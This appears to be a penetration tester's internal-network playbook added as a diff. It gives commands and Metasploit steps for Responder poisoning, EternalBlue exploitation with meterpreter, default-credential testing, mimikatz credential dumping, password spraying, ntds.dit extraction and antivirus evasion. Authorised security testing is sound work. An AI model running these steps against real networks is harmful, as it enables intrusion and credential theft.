@@ -1,0 +1,161 @@
+Build your connection to scanner:
+--Make list of subnets
+--Use autoript to log in to scanner remotely (remember sudo is required for any commands as this is an ubuntu box not a kali box, were not root by default)
+--Setup responder and run first thing, best to start in the AM, as people login on allows for better chance of spoofing authentication requests.
+	--sudo apt-get install git
+	--git clone https://github.com/SpiderLabs/Responder
+	--cd Responder
+sudo ./Responder.py -I eth0 -i <IP OF SCANNER> -w on -F on -r on -b
+
+
+--Build routes to scanner (On attacking host -- typically your kali box) ,
+for i in $(cat subnets); do route add -net $i gw 19.1.1.2 ; done
+
+--Use fping to identify list of live hosts
+for i in $(cat subnets); do fping -aq -g $i >> hosts; done
+
+
+--------------------------------------------------------------------------------		
+Routing your windows box::::
+
+
+-Route Traffic to Windows
+In scanner
+	sudo route add -host 172.24.44.61 gw 19.1.1.1
+In Kali Box
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	cat /proc/sys/net/ipv4/ip_forward (look for “1”)
+In Windows
+	route add 10.0.45.0/25 mask 255.255.255.0 10.0.2.15
+	ping client’s scanner IP to verify
+
+
+--------------------------------------------------------------------------------			
+Service Scans/Recon:
+--Nmap Scans
+
+INITIAL -- without version scan, this is so you can get right to testing..
+nmap -sSU 10.10.10.153 -Pn -p U:53,123,161,162,623,500,T:20-23,25,53,67-68,69,79-80,88,110-111,113,135,137-139,143,179,264,389,443-445,465,513-514,541,546-547,554,587,636,873,902,993,995,1003,1025-1029,1433,1720,1723,1755,2000,2042,2049,2082,2083,2086,2087,2096,2097,2483-2484,2967,3128,3306,3389,3400,3689,4097,5000,5009,5050,5060,5061,5190,5432,5500,5631-5632,5666,5800,5900-5901,6000-6001,8008-8010,8080-8081,8443,9100 -oG nmapscan
+
+SECONDARY SCAN -- with versions for further testing, vulnerable software identification.
+nmap -sSUV 10.10.10.153 -Pn -p U:53,123,161,162,623,500,T:20-23,25,53,67-68,69,79-80,88,110-111,113,135,137-139,143,179,264,389,443-445,465,513-514,541,546-547,554,587,636,873,902,993,995,1003,1025-1029,1433,1720,1723,1755,2000,2042,2049,2082,2083,2086,2087,2096,2097,2483-2484,2967,3128,3306,3389,3400,3689,4097,5000,5009,5050,5060,5061,5190,5432,5500,5631-5632,5666,5800,5900-5901,6000-6001,8008-8010,8080-8081,8443,9100 -oG nmapscan
+	
+-parse with nmap-grep.sh
+
+--OS version scans -- use auxilliary/scanner/smb/smb_version
+								-set rhosts file:smb-hosts.txt
+								
+##look for old OS's , server 2003, XP, anything older than 7 essentially
+
+--eyewitness
+
+
+--FTP anonymous access scan
+	/auxilliary/scanner/ftp/anonymous
+##Look for non-printer shares, these typically are most valuable, don't write up as vulnerability unless the file share is on a critical system or if sensitive information is found in the anonymous share.. for example, a couple FTP shares open on some printers are very low risk so those would not be included as a vulnerability.
+
+
+--------------------------------------------------------------------------------		
+Initial Access/Footholds:
+--Relay attacks (responder, ntlmrelayx, mtim6)
+--EternalBlue/SMB RCE 
+		--have most success with $$use payload windows/meterpreter/tcp_bind_uuid
+		--32bit systems require extra configuration(look up double pulsar exploit)
+
+--Check web servers for LDAP configuration and point at responder(not likely so look for this as last go)
+--Default credentials then dumping passwords/hashes/etc through that avenue
+
+
+--------------------------------------------------------------------------------		
+
+Default Credentials: Note -- Lockout thresholds are typically not set for ssh/telnet
+###Always test the following: All can be tested through metasploit modules
+ssh -- root:root , admin:admin, admin:password, cisco:cisco
+sql -- sa:sa
+telnet -- same as ssh
+http/https -- depends on vendor, defaults can be enumerated from sources online
+##Further default testing can be done by enumerating banners and looking up known defaults for common systems
+--------------------------------------------------------------------------------		
+Once you have a meterpreter session:
+-mimkatz (dump credentials, view domain info)
+-incognito mode(impersonating users)
+-look for sensitive info on file system
+
+--------------------------------------------------------------------------------		
+Abusing Web Servers::
+-nikto
+-wpscan
+-dirb
+
+
+--------------------------------------------------------------------------------		
+Infogathering::
+-SNMP login
+-LDAP (enum4linux, rpcclient, null based sessions(ldapsearch))
+-
+
+
+--------------------------------------------------------------------------------		
+
+After gaining credentials:
+-Spray with SMB
+	-Look for local admin
+		-Invoke SMB sessions, SMB attacks, dump more credentials
+		
+--------------------------------------------------------------------------------		
+Eternal Blue:
+1.) Open MSFConsole
+2.) use auxiliary/scanner/smb/smb_ms17_010
+                --set rhosts file:smb-hosts.txt
+                --run
+                --identify vulnerable hosts
+3.) Vulnerable hosts needs to be x64bit systems to use these modules
+                --use exploit/windows/smb/ms17_010_eternalblue
+                --use exploit/windows/smb/ms17_010_eternalblue_win8    -- windows 8 machines/laterally
+                                                --set rhosts 
+                                                --set payload windows/x64/meterpreter/bind_tcp_uuid    (i have best luck with this payload)
+                                                --get meterpreter shell
+                                                                --search directories and download sensitive files with Meterpreter shell --https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+                                                                --use mimikatz and incognito mode to escale privlidges, impersonate tokens, and dump credentials (see reference above)
+                                                                --shell (type shell to get the windows cmd prompt and see what user you have your shell from)
+                                                                **There is other things you can do from here you just have to be creative, the above notes are just what I've had most success with for laterally moving/getting sensitive info, etc...**
+                                                                
+If the eternal-blue exploit keeps failing, this may be due to antivirus blocking the payload, encrypting the payload may help -- https://gbhackers.com/bypass-antivirus-using-payload/
+
+ONCE YOU HAVE SHELL::::::
+MimiKatz -- Dump system information, escalate privileges, dump credentials from memory, and much more:
+
+https://www.trustedsec.com/2015/04/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
+https://www.varonis.com/blog/what-is-mimikatz/
+
+Incognito Mode -- Impersonate tokens, try to impersonate domain accounts and use that to create accounts/pivot to other machines/laterally move, etc.. :
+
+https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
+
+--------------------------------------------------------------------------------				
+
+Extras::
+##Open IPMI ports are almost always instant win -- Port 623, dumps hashes, metasploit has corresponding module
+##If you obtain user-names from this try to brute force common passwords such as P@ssword1 or Summer2019! --- BE CAREFUL TO NOT LOCKOUT ACCOUNTS, determine lockout threshold via scoping form):
+
+Other Tid-Bits::::
+--Go beyond hunting for exploitable hosts, while this can provide a win a times, look at the landscape as whole.. think, how can I abuse misconfigurations and leverage information/access gained from the tools as whole
+--Keep in mind you can abuse protocols to gain access just as you can exploit software
+--Abuse active directory
+--Run any hashes you obtain through the crack server -- see me for help configuring that, spray and leverage these found credentials on other parts of the network
+--NTLMv1 hashes?? these can be relayed, NTLMv2 cannot
+--Check vulnerability scanner for exploitable systems, info gathering, etc
+--Correlate CVE's and software versions with google to find POC available exploits, just because a CVE and vulnerability has been recognized, does not mean the code is publicly available, use key terms in google such as POC, exploit (usually on social media and github)
+--Push files to scanner using SCP
+--Pull files from remote machines using smbmap
+--Remember that Responder only captures traffic in the broadcast domain it resides on .. if you gain access to other broadcast domains, perhaps consider running responder there (powershell versions are available for windows hosts
+--Look into following tools -- Responder, Bloodhound, Impacket, mitm6 -- great examples of tools that can be used in combination with each other to leverage credentials and access via abusing protocols and least privilege
+
+
+If you obtain Domain Admin:
+--Show proof of concept by adding yourself as a domain admin
+--Find sensitive servers and RDP to them to show access and sensitive information leakage(backup servers, domain controllers, core application server)
+--dump ntds.dit file and crack all hashes, this can be done a number of different way, google is your friend here
+--
+
+https://github.com/dirkjanm?tab=repositories
